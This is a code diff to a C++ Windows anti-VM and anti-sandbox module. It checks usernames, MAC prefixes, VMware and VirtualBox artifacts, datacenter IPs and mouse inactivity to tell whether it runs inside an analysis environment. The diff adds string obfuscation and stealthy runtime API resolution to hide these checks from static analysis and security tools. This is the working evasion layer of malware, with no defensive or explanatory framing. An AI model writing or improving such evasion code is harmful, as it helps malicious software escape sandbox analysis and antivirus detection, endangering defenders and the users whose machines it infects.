@@ -8,31 +8,70 @@
 #include <algorithm>
 #include <cctype>
 
-#pragma comment(lib, "winhttp.lib")
-#pragma comment(lib, "iphlpapi.lib")
-#pragma comment(lib, "advapi32.lib")
+#include "../Obfusk8/Instrumentation/materialization/state/Obfusk8Core.hpp"
+
+typedef BOOL(WINAPI* pGetUserNameA_t)(LPSTR, LPDWORD);
+typedef DWORD(WINAPI* pGetFileAttributesA_t)(LPCSTR);
+typedef LONG(WINAPI* pRegOpenKeyExA_t)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
+typedef LONG(WINAPI* pRegCloseKey_t)(HKEY);
+typedef SC_HANDLE(WINAPI* pOpenSCManagerA_t)(LPCSTR, LPCSTR, DWORD);
+typedef SC_HANDLE(WINAPI* pOpenServiceA_t)(SC_HANDLE, LPCSTR, DWORD);
+typedef BOOL(WINAPI* pCloseServiceHandle_t)(SC_HANDLE);
+typedef HANDLE(WINAPI* pCreateToolhelp32Snapshot_t)(DWORD, DWORD);
+typedef BOOL(WINAPI* pProcess32FirstW_t)(HANDLE, LPPROCESSENTRY32W);
+typedef BOOL(WINAPI* pProcess32NextW_t)(HANDLE, LPPROCESSENTRY32W);
+typedef BOOL(WINAPI* pCloseHandle_t)(HANDLE);
+typedef DWORD(WINAPI* pGetAdaptersInfo_t)(PIP_ADAPTER_INFO, PULONG);
+typedef HINTERNET(WINAPI* pWinHttpOpen_t)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
+typedef HINTERNET(WINAPI* pWinHttpConnect_t)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
+typedef HINTERNET(WINAPI* pWinHttpOpenRequest_t)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
+typedef BOOL(WINAPI* pWinHttpSendRequest_t)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
+typedef BOOL(WINAPI* pWinHttpReceiveResponse_t)(HINTERNET, LPVOID);
+typedef BOOL(WINAPI* pWinHttpQueryDataAvailable_t)(HINTERNET, LPDWORD);
+typedef BOOL(WINAPI* pWinHttpReadData_t)(HINTERNET, LPVOID, DWORD, LPDWORD);
+typedef BOOL(WINAPI* pWinHttpCloseHandle_t)(HINTERNET);
+typedef BOOL(WINAPI* pGetCursorPos_t)(LPPOINT);
+typedef void(WINAPI* pSleep_t)(DWORD);
+typedef DWORD(WINAPI* pGetTickCount_t)();
 
 namespace AntiVM {
 
 // VM MAC address list
 const std::vector<std::string> vmMacList = {
-    "00:0c:29", "00:50:56", "08:00:27", "52:54:00", "00:21:F6",
-    "00:14:4F", "00:0F:4B", "00:10:E0", "00:00:7D", "00:21:28",
-    "00:01:5D", "00:A0:A4", "00:07:82", "00:03:BA", "08:00:20",
-    "2C:C2:60", "00:10:4F", "00:13:97", "00:20:F2"
+    OBFUSCATE_STRING("00:0c:29"), OBFUSCATE_STRING("00:50:56"),
+    OBFUSCATE_STRING("08:00:27"), OBFUSCATE_STRING("52:54:00"),
+    OBFUSCATE_STRING("00:21:F6"), OBFUSCATE_STRING("00:14:4F"),
+    OBFUSCATE_STRING("00:0F:4B"), OBFUSCATE_STRING("00:10:E0"),
+    OBFUSCATE_STRING("00:00:7D"), OBFUSCATE_STRING("00:21:28"),
+    OBFUSCATE_STRING("00:01:5D"), OBFUSCATE_STRING("00:A0:A4"),
+    OBFUSCATE_STRING("00:07:82"), OBFUSCATE_STRING("00:03:BA"),
+    OBFUSCATE_STRING("08:00:20"), OBFUSCATE_STRING("2C:C2:60"),
+    OBFUSCATE_STRING("00:10:4F"), OBFUSCATE_STRING("00:13:97"),
+    OBFUSCATE_STRING("00:20:F2")
 };
 
 // Blacklisted usernames
 const std::vector<std::string> usernameBlacklist = {
-    "billy", "george", "abby", "darrel jones", "john",
-    "john zalinsk", "john doe", "shctaga3rm", "uv0u6479bogy",
-    "8wjxnbz", "walker", "oxyt3lzggzmk", "t3wobowwaw",
-    "uh6pn", "smdvvcp", "06aay3", "mlfanllp", "jpqlavkfb0lt0",
-    "7hv8but5biscz", "afgxgd9fq4iv8", "frank", "anna",
-    "wdagutilityaccount", "hal9th", "virus", "malware",
-    "sandbox", "sample", "currentuser", "emily", "hapubws",
-    "hong lee", "jaakw.q", "it-admin", "johnson", "miller",
-    "milozs", "microsoft", "sand box", "maltest"
+    OBFUSCATE_STRING("billy"), OBFUSCATE_STRING("george"),
+    OBFUSCATE_STRING("abby"), OBFUSCATE_STRING("darrel jones"),
+    OBFUSCATE_STRING("john"), OBFUSCATE_STRING("john zalinsk"),
+    OBFUSCATE_STRING("john doe"), OBFUSCATE_STRING("shctaga3rm"),
+    OBFUSCATE_STRING("uv0u6479bogy"), OBFUSCATE_STRING("8wjxnbz"),
+    OBFUSCATE_STRING("walker"), OBFUSCATE_STRING("oxyt3lzggzmk"),
+    OBFUSCATE_STRING("t3wobowwaw"), OBFUSCATE_STRING("uh6pn"),
+    OBFUSCATE_STRING("smdvvcp"), OBFUSCATE_STRING("06aay3"),
+    OBFUSCATE_STRING("mlfanllp"), OBFUSCATE_STRING("jpqlavkfb0lt0"),
+    OBFUSCATE_STRING("7hv8but5biscz"), OBFUSCATE_STRING("afgxgd9fq4iv8"),
+    OBFUSCATE_STRING("frank"), OBFUSCATE_STRING("anna"),
+    OBFUSCATE_STRING("wdagutilityaccount"), OBFUSCATE_STRING("hal9th"),
+    OBFUSCATE_STRING("virus"), OBFUSCATE_STRING("malware"),
+    OBFUSCATE_STRING("sandbox"), OBFUSCATE_STRING("sample"),
+    OBFUSCATE_STRING("currentuser"), OBFUSCATE_STRING("emily"),
+    OBFUSCATE_STRING("hapubws"), OBFUSCATE_STRING("hong lee"),
+    OBFUSCATE_STRING("jaakw.q"), OBFUSCATE_STRING("it-admin"),
+    OBFUSCATE_STRING("johnson"), OBFUSCATE_STRING("miller"),
+    OBFUSCATE_STRING("milozs"), OBFUSCATE_STRING("microsoft"),
+    OBFUSCATE_STRING("sand box"), OBFUSCATE_STRING("maltest")
 };
 
 // Helper function to convert string to lowercase
@@ -45,9 +84,11 @@ std::string ToLower(const std::string& str) {
 
 // Get current username
 std::string GetUsername() {
+    pGetUserNameA_t _GetUserNameA = (pGetUserNameA_t)STEALTH_API_OBFSTR("advapi32.dll", "GetUserNameA");
+    if (!_GetUserNameA) return "";
     char username[256];
     DWORD size = sizeof(username);
-    if (GetUserNameA(username, &size)) {
+    if (_GetUserNameA(username, &size)) {
         return std::string(username);
     }
     return "";
@@ -55,18 +96,26 @@ std::string GetUsername() {
 
 // Check if file exists
 bool FileExists(const std::string& path) {
-    DWORD attrs = GetFileAttributesA(path.c_str());
+    pGetFileAttributesA_t _GetFileAttributesA = (pGetFileAttributesA_t)STEALTH_API_OBFSTR("kernel32.dll", "GetFileAttributesA");
+    if (!_GetFileAttributesA) return false;
+    DWORD attrs = _GetFileAttributesA(path.c_str());
     return (attrs != INVALID_FILE_ATTRIBUTES && !(attrs & FILE_ATTRIBUTE_DIRECTORY));
 }
 
 // Check if directory exists
 bool DirectoryExists(const std::string& path) {
-    DWORD attrs = GetFileAttributesA(path.c_str());
+    pGetFileAttributesA_t _GetFileAttributesA = (pGetFileAttributesA_t)STEALTH_API_OBFSTR("kernel32.dll", "GetFileAttributesA");
+    if (!_GetFileAttributesA) return false;
+    DWORD attrs = _GetFileAttributesA(path.c_str());
     return (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY));
 }
 
 // Check if registry key exists
 bool CheckRegistryKey(const std::string& keyPath) {
+    pRegOpenKeyExA_t _RegOpenKeyExA = (pRegOpenKeyExA_t)STEALTH_API_OBFSTR("advapi32.dll", "RegOpenKeyExA");
+    pRegCloseKey_t _RegCloseKey = (pRegCloseKey_t)STEALTH_API_OBFSTR("advapi32.dll", "RegCloseKey");
+    if (!_RegOpenKeyExA || !_RegCloseKey) return false;
+
     HKEY hKey;
     size_t pos = keyPath.find('\\');
     if (pos == std::string::npos) return false;
@@ -75,15 +124,15 @@ bool CheckRegistryKey(const std::string& keyPath) {
     std::string subKey = keyPath.substr(pos + 1);
 
     HKEY root = HKEY_LOCAL_MACHINE;
-    if (rootKey == "HKEY_LOCAL_MACHINE" || rootKey == "HKLM") {
+    if (rootKey == OBFUSCATE_STRING("HKEY_LOCAL_MACHINE") || rootKey == OBFUSCATE_STRING("HKLM")) {
         root = HKEY_LOCAL_MACHINE;
-    } else if (rootKey == "HKEY_CURRENT_USER" || rootKey == "HKCU") {
+    } else if (rootKey == OBFUSCATE_STRING("HKEY_CURRENT_USER") || rootKey == OBFUSCATE_STRING("HKCU")) {
         root = HKEY_CURRENT_USER;
     }
 
-    LONG result = RegOpenKeyExA(root, subKey.c_str(), 0, KEY_READ, &hKey);
+    LONG result = _RegOpenKeyExA(root, subKey.c_str(), 0, KEY_READ, &hKey);
     if (result == ERROR_SUCCESS) {
-        RegCloseKey(hKey);
+        _RegCloseKey(hKey);
         return true;
     }
     return false;
@@ -91,40 +140,51 @@ bool CheckRegistryKey(const std::string& keyPath) {
 
 // Check if a Windows service exists
 bool CheckServiceExists(const std::string& serviceName) {
-    SC_HANDLE scManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
+    pOpenSCManagerA_t _OpenSCManagerA = (pOpenSCManagerA_t)STEALTH_API_OBFSTR("advapi32.dll", "OpenSCManagerA");
+    pOpenServiceA_t _OpenServiceA = (pOpenServiceA_t)STEALTH_API_OBFSTR("advapi32.dll", "OpenServiceA");
+    pCloseServiceHandle_t _CloseServiceHandle = (pCloseServiceHandle_t)STEALTH_API_OBFSTR("advapi32.dll", "CloseServiceHandle");
+    if (!_OpenSCManagerA || !_OpenServiceA || !_CloseServiceHandle) return false;
+
+    SC_HANDLE scManager = _OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
     if (!scManager) return false;
 
-    SC_HANDLE service = OpenServiceA(scManager, serviceName.c_str(), SERVICE_QUERY_STATUS);
+    SC_HANDLE service = _OpenServiceA(scManager, serviceName.c_str(), SERVICE_QUERY_STATUS);
     bool exists = (service != NULL);
 
-    if (service) CloseServiceHandle(service);
-    CloseServiceHandle(scManager);
+    if (service) _CloseServiceHandle(service);
+    _CloseServiceHandle(scManager);
 
     return exists;
 }
 
 // Check if a process is running
 bool CheckProcessRunning(const std::string& processName) {
-    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    pCreateToolhelp32Snapshot_t _CreateToolhelp32Snapshot = (pCreateToolhelp32Snapshot_t)STEALTH_API_OBFSTR("kernel32.dll", "CreateToolhelp32Snapshot");
+    pProcess32FirstW_t _Process32FirstW = (pProcess32FirstW_t)STEALTH_API_OBFSTR("kernel32.dll", "Process32FirstW");
+    pProcess32NextW_t _Process32NextW = (pProcess32NextW_t)STEALTH_API_OBFSTR("kernel32.dll", "Process32NextW");
+    pCloseHandle_t _CloseHandle = (pCloseHandle_t)STEALTH_API_OBFSTR("kernel32.dll", "CloseHandle");
+    if (!_CreateToolhelp32Snapshot || !_Process32FirstW || !_Process32NextW || !_CloseHandle) return false;
+
+    HANDLE snapshot = _CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snapshot == INVALID_HANDLE_VALUE) return false;
 
-    PROCESSENTRY32 processEntry;
-    processEntry.dwSize = sizeof(PROCESSENTRY32);
+    PROCESSENTRY32W processEntry;
+    processEntry.dwSize = sizeof(PROCESSENTRY32W);
 
     std::string lowerProcessName = ToLower(processName);
 
-    if (Process32First(snapshot, &processEntry)) {
+    if (_Process32FirstW(snapshot, &processEntry)) {
         do {
             std::wstring wideExeFile(processEntry.szExeFile);
             std::string exeFile = ToLower(std::string(wideExeFile.begin(), wideExeFile.end()));
             if (exeFile.find(lowerProcessName) != std::string::npos) {
-                CloseHandle(snapshot);
+                _CloseHandle(snapshot);
                 return true;
             }
-        } while (Process32Next(snapshot, &processEntry));
+        } while (_Process32NextW(snapshot, &processEntry));
     }
 
-    CloseHandle(snapshot);
+    _CloseHandle(snapshot);
     return false;
 }
 
@@ -133,74 +193,59 @@ std::pair<bool, std::string> DetectVM() {
     // Check username blacklist
     std::string username = GetUsername();
     if (CheckUsernameBlacklist(username)) {
-        return std::make_pair(true, "Blacklisted username: " + username);
+        return std::make_pair(true, OBFUSCATE_STRING("Blacklisted username: ") + username);
     }
 
     // Check MAC addresses
     auto macResult = CheckMacAddress();
     if (macResult.second) {
-        return std::make_pair(true, "Suspicious MAC address: " + macResult.first);
+        return std::make_pair(true, OBFUSCATE_STRING("Suspicious MAC address: ") + macResult.first);
     }
 
     // Check for VMware
     if (DetectVMwareWindows()) {
-        return std::make_pair(true, "VMware detected");
+        return std::make_pair(true, OBFUSCATE_STRING("VMware detected"));
     }
 
     // Check for VirtualBox
     if (DetectVirtualBoxWindows()) {
-        return std::make_pair(true, "VirtualBox detected");
-    }
-
-    // Check for QEMU
-    if (DetectQEMU()) {
-        return std::make_pair(true, "QEMU detected");
-    }
-
-    // Check for Xen
-    if (DetectXenWindows()) {
-        return std::make_pair(true, "Xen detected");
-    }
-
-    // Check for Parallels
-    if (DetectParallels()) {
-        return std::make_pair(true, "Parallels detected");
-    }
-
-    // Check for KVM
-    if (DetectKVMWindows()) {
-        return std::make_pair(true, "KVM detected");
+        return std::make_pair(true, OBFUSCATE_STRING("VirtualBox detected"));
     }
 
     // Check for datacenter/hosting provider
     if (DetectHostingProvider()) {
-        return std::make_pair(true, "Hosting provider detected");
+        return std::make_pair(true, OBFUSCATE_STRING("Hosting provider detected"));
     }
 
-    return std::make_pair(false, "No VM detected");
+    // Check for mouse movement (sandboxes typically have no user input)
+    if (CheckMouseMovement()) {
+        return std::make_pair(true, OBFUSCATE_STRING("No mouse movement detected"));
+    }
+
+    return std::make_pair(false, OBFUSCATE_STRING("No VM detected"));
 }
 
 // DetectVMwareWindows
 bool DetectVMwareWindows() {
     // Check for VMware driver
-    if (FileExists("C:\\Windows\\System32\\drivers\\vmci.sys")) {
+    if (FileExists(OBFUSCATE_STRING("C:\\Windows\\System32\\drivers\\vmci.sys"))) {
         return true;
     }
 
     // Check for VMware Tools service
-    if (CheckServiceExists("VMTools")) {
+    if (CheckServiceExists(OBFUSCATE_STRING("VMTools"))) {
         return true;
     }
 
     // Check for VMware registry entry
-    if (CheckRegistryKey("HKEY_LOCAL_MACHINE\\Software\\VMware, Inc.")) {
+    if (CheckRegistryKey(OBFUSCATE_STRING("HKEY_LOCAL_MACHINE\\Software\\VMware, Inc."))) {
         return true;
     }
 
     // Check for VMware specific files
     std::vector<std::string> vmwareFiles = {
-        "C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe",
-        "C:\\Program Files (x86)\\VMware\\VMware Tools\\vmtoolsd.exe"
+        OBFUSCATE_STRING("C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe"),
+        OBFUSCATE_STRING("C:\\Program Files (x86)\\VMware\\VMware Tools\\vmtoolsd.exe")
     };
 
     for (const auto& file : vmwareFiles) {
@@ -215,19 +260,19 @@ bool DetectVMwareWindows() {
 // DetectVirtualBoxWindows
 bool DetectVirtualBoxWindows() {
     // Check for VirtualBox driver
-    if (FileExists("C:\\Windows\\System32\\drivers\\VBoxMouse.sys")) {
+    if (FileExists(OBFUSCATE_STRING("C:\\Windows\\System32\\drivers\\VBoxMouse.sys"))) {
         return true;
     }
 
     // Check for VirtualBox registry entry
-    if (CheckRegistryKey("HKEY_LOCAL_MACHINE\\Software\\Oracle\\VirtualBox")) {
+    if (CheckRegistryKey(OBFUSCATE_STRING("HKEY_LOCAL_MACHINE\\Software\\Oracle\\VirtualBox"))) {
         return true;
     }
 
     // Check for VirtualBox specific directories
     std::vector<std::string> vboxDirs = {
-        "C:\\Program Files\\Oracle\\VirtualBox",
-        "C:\\Program Files (x86)\\Oracle\\VirtualBox"
+        OBFUSCATE_STRING("C:\\Program Files\\Oracle\\VirtualBox"),
+        OBFUSCATE_STRING("C:\\Program Files (x86)\\Oracle\\VirtualBox")
     };
 
     for (const auto& dir : vboxDirs) {
@@ -237,79 +282,7 @@ bool DetectVirtualBoxWindows() {
     }
 
     // Check for VirtualBox process
-    if (CheckProcessRunning("VBoxTray.exe")) {
-        return true;
-    }
-
-    return false;
-}
-
-// DetectQEMU
-bool DetectQEMU() {
-    // Check for QEMU driver
-    if (FileExists("C:\\Windows\\System32\\drivers\\qemu-ga.sys")) {
-        return true;
-    }
-
-    // Check for QEMU process
-    if (CheckProcessRunning("qemu-system")) {
-        return true;
-    }
-
-    return false;
-}
-
-// DetectXenWindows
-bool DetectXenWindows() {
-    // Check for Xen driver
-    if (FileExists("C:\\Windows\\System32\\drivers\\xenevtchn.sys")) {
-        return true;
-    }
-
-    // Check for Xen registry entry
-    if (CheckRegistryKey("HKEY_LOCAL_MACHINE\\Software\\Xen")) {
-        return true;
-    }
-
-    return false;
-}
-
-// DetectParallels
-bool DetectParallels() {
-    // Check for Parallels driver
-    if (FileExists("C:\\Windows\\System32\\drivers\\prlfs.sys")) {
-        return true;
-    }
-
-    // Check for Parallels registry entry
-    if (CheckRegistryKey("HKEY_LOCAL_MACHINE\\Software\\Parallels")) {
-        return true;
-    }
-
-    // Check for Parallels specific directories
-    std::vector<std::string> parallelDirs = {
-        "C:\\Program Files\\Parallels\\Parallels Tools",
-        "C:\\Program Files (x86)\\Parallels\\Parallels Tools"
-    };
-
-    for (const auto& dir : parallelDirs) {
-        if (DirectoryExists(dir)) {
-            return true;
-        }
-    }
-
-    return false;
-}
-
-// DetectKVMWindows
-bool DetectKVMWindows() {
-    // Check for KVM driver
-    if (FileExists("C:\\Windows\\System32\\drivers\\balloon.sys")) {
-        return true;
-    }
-
-    // Check for KVM process
-    if (CheckProcessRunning("kvm.exe")) {
+    if (CheckProcessRunning(OBFUSCATE_STRING("VBoxTray.exe"))) {
         return true;
     }
 
@@ -331,6 +304,9 @@ bool CheckUsernameBlacklist(const std::string& username) {
 
 // CheckMacAddress
 std::pair<std::string, bool> CheckMacAddress() {
+    pGetAdaptersInfo_t _GetAdaptersInfo = (pGetAdaptersInfo_t)STEALTH_API_OBFSTR("iphlpapi.dll", "GetAdaptersInfo");
+    if (!_GetAdaptersInfo) return std::make_pair("", false);
+
     ULONG bufferSize = 15000;
     PIP_ADAPTER_INFO adapterInfo = (IP_ADAPTER_INFO*)malloc(bufferSize);
     
@@ -338,7 +314,7 @@ std::pair<std::string, bool> CheckMacAddress() {
         return std::make_pair("", false);
     }
 
-    if (GetAdaptersInfo(adapterInfo, &bufferSize) == ERROR_BUFFER_OVERFLOW) {
+    if (_GetAdaptersInfo(adapterInfo, &bufferSize) == ERROR_BUFFER_OVERFLOW) {
         free(adapterInfo);
         adapterInfo = (IP_ADAPTER_INFO*)malloc(bufferSize);
         if (adapterInfo == NULL) {
@@ -346,7 +322,7 @@ std::pair<std::string, bool> CheckMacAddress() {
         }
     }
 
-    if (GetAdaptersInfo(adapterInfo, &bufferSize) == NO_ERROR) {
+    if (_GetAdaptersInfo(adapterInfo, &bufferSize) == NO_ERROR) {
         PIP_ADAPTER_INFO adapter = adapterInfo;
         
         while (adapter) {
@@ -387,80 +363,96 @@ std::pair<std::string, bool> CheckMacAddress() {
 
 // FetchIPFromService
 std::string FetchIPFromService(const std::string& url) {
+    pWinHttpOpen_t _WinHttpOpen = (pWinHttpOpen_t)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpOpen");
+    pWinHttpConnect_t _WinHttpConnect = (pWinHttpConnect_t)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpConnect");
+    pWinHttpOpenRequest_t _WinHttpOpenRequest = (pWinHttpOpenRequest_t)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpOpenRequest");
+    pWinHttpSendRequest_t _WinHttpSendRequest = (pWinHttpSendRequest_t)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpSendRequest");
+    pWinHttpReceiveResponse_t _WinHttpReceiveResponse = (pWinHttpReceiveResponse_t)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpReceiveResponse");
+    pWinHttpQueryDataAvailable_t _WinHttpQueryDataAvailable = (pWinHttpQueryDataAvailable_t)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpQueryDataAvailable");
+    pWinHttpReadData_t _WinHttpReadData = (pWinHttpReadData_t)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpReadData");
+    pWinHttpCloseHandle_t _WinHttpCloseHandle = (pWinHttpCloseHandle_t)STEALTH_API_OBFSTR("winhttp.dll", "WinHttpCloseHandle");
+    if (!_WinHttpOpen || !_WinHttpConnect || !_WinHttpOpenRequest ||
+        !_WinHttpSendRequest || !_WinHttpReceiveResponse ||
+        !_WinHttpQueryDataAvailable || !_WinHttpReadData || !_WinHttpCloseHandle) return "";
+
     std::string result;
-    
+
     // Parse URL manually
     std::string scheme, hostName, urlPath;
     bool useSSL = false;
     WORD port = 80;
-    
-    size_t schemeEnd = url.find("://");
+
+    size_t schemeEnd = url.find(OBFUSCATE_STRING("://"));
     if (schemeEnd == std::string::npos) {
         return "";
     }
-    
+
     scheme = url.substr(0, schemeEnd);
-    useSSL = (scheme == "https");
+    useSSL = (scheme == OBFUSCATE_STRING("https"));
     port = useSSL ? 443 : 80;
-    
+
     size_t hostStart = schemeEnd + 3;
     size_t pathStart = url.find('/', hostStart);
-    
+
     if (pathStart == std::string::npos) {
         hostName = url.substr(hostStart);
-        urlPath = "/";
+        urlPath = OBFUSCATE_STRING("/");
     } else {
         hostName = url.substr(hostStart, pathStart - hostStart);
         urlPath = url.substr(pathStart);
     }
 
-    HINTERNET hSession = WinHttpOpen(L"AntiVM/1.0", 
+    std::string _uaNarrow = OBFUSCATE_STRING("AntiVM/1.0");
+    std::wstring wUserAgent(_uaNarrow.begin(), _uaNarrow.end());
+    HINTERNET hSession = _WinHttpOpen(wUserAgent.c_str(),
                                       WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-                                      WINHTTP_NO_PROXY_NAME, 
+                                      WINHTTP_NO_PROXY_NAME,
                                       WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession) return "";
 
     std::wstring wHostName(hostName.begin(), hostName.end());
-    HINTERNET hConnect = WinHttpConnect(hSession, wHostName.c_str(), 
-                                        port, 0);
+    HINTERNET hConnect = _WinHttpConnect(hSession, wHostName.c_str(),
+                                         port, 0);
     if (!hConnect) {
-        WinHttpCloseHandle(hSession);
+        _WinHttpCloseHandle(hSession);
         return "";
     }
 
     std::wstring wUrlPath(urlPath.begin(), urlPath.end());
+    std::string _getNarrow = OBFUSCATE_STRING("GET");
+    std::wstring wGET(_getNarrow.begin(), _getNarrow.end());
     DWORD flags = useSSL ? WINHTTP_FLAG_SECURE : 0;
-    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", wUrlPath.c_str(),
-                                            NULL, WINHTTP_NO_REFERER,
-                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
-                                            flags);
+    HINTERNET hRequest = _WinHttpOpenRequest(hConnect, wGET.c_str(), wUrlPath.c_str(),
+                                             NULL, WINHTTP_NO_REFERER,
+                                             WINHTTP_DEFAULT_ACCEPT_TYPES,
+                                             flags);
     if (!hRequest) {
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
+        _WinHttpCloseHandle(hConnect);
+        _WinHttpCloseHandle(hSession);
         return "";
     }
 
-    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
-                           WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
-        WinHttpReceiveResponse(hRequest, NULL)) {
-        
+    if (_WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
+        _WinHttpReceiveResponse(hRequest, NULL)) {
+
         DWORD bytesAvailable = 0;
         char buffer[1024];
-        
-        while (WinHttpQueryDataAvailable(hRequest, &bytesAvailable) && bytesAvailable > 0) {
+
+        while (_WinHttpQueryDataAvailable(hRequest, &bytesAvailable) && bytesAvailable > 0) {
             DWORD bytesRead = 0;
             DWORD toRead = bytesAvailable < (sizeof(buffer) - 1) ? bytesAvailable : (sizeof(buffer) - 1);
-            
-            if (WinHttpReadData(hRequest, buffer, toRead, &bytesRead)) {
+
+            if (_WinHttpReadData(hRequest, buffer, toRead, &bytesRead)) {
                 buffer[bytesRead] = '\0';
                 result += buffer;
             }
         }
     }
 
-    WinHttpCloseHandle(hRequest);
-    WinHttpCloseHandle(hConnect);
-    WinHttpCloseHandle(hSession);
+    _WinHttpCloseHandle(hRequest);
+    _WinHttpCloseHandle(hConnect);
+    _WinHttpCloseHandle(hSession);
 
     // Trim whitespace
     result.erase(0, result.find_first_not_of(" \t\n\r"));
@@ -469,40 +461,44 @@ std::string FetchIPFromService(const std::string& url) {
     return result;
 }
 
-// GetPublicIP
-std::string GetPublicIP() {
-    std::vector<std::string> services = {
-        "https://api.ipify.org?format=text",
-        "https://icanhazip.com",
-        "https://ifconfig.me",
-        "https://checkip.amazonaws.com"
-    };
+// CheckMouseMovement
+bool CheckMouseMovement() {
+    pGetCursorPos_t _GetCursorPos = (pGetCursorPos_t)STEALTH_API_OBFSTR("user32.dll", "GetCursorPos");
+    pSleep_t _Sleep = (pSleep_t)STEALTH_API_OBFSTR("kernel32.dll", "Sleep");
+    pGetTickCount_t _GetTickCount = (pGetTickCount_t)STEALTH_API_OBFSTR("kernel32.dll", "GetTickCount");
+    if (!_GetCursorPos || !_Sleep || !_GetTickCount) return false;
 
-    for (const auto& service : services) {
-        std::string ip = FetchIPFromService(service);
-        if (!ip.empty() && ip != "unknown") {
-            return ip;
+    POINT initialPos;
+    _GetCursorPos(&initialPos);
+
+    DWORD startTime = _GetTickCount();
+    while (_GetTickCount() - startTime < 5000) {
+        _Sleep(100);
+        POINT currentPos;
+        _GetCursorPos(&currentPos);
+        if (currentPos.x != initialPos.x || currentPos.y != initialPos.y) {
+            return false;
         }
     }
 
-    return "unknown";
+    return true;
 }
 
 // DetectHostingProvider
 bool DetectHostingProvider() {
-    std::string response = FetchIPFromService("https://api.ipapi.is/");
-    
+    std::string response = FetchIPFromService(OBFUSCATE_STRING("https://api.ipapi.is/"));
+
     if (response.empty()) {
         return false;
     }
 
     // Simple JSON parsing for "is_datacenter" field
-    size_t pos = response.find("\"is_datacenter\"");
+    size_t pos = response.find(OBFUSCATE_STRING("\"is_datacenter\""));
     if (pos != std::string::npos) {
-        size_t truePos = response.find("true", pos);
-        size_t falsePos = response.find("false", pos);
-        
-        if (truePos != std::string::npos && 
+        size_t truePos = response.find(OBFUSCATE_STRING("true"), pos);
+        size_t falsePos = response.find(OBFUSCATE_STRING("false"), pos);
+
+        if (truePos != std::string::npos &&
             (falsePos == std::string::npos || truePos < falsePos)) {
             return true;
         }
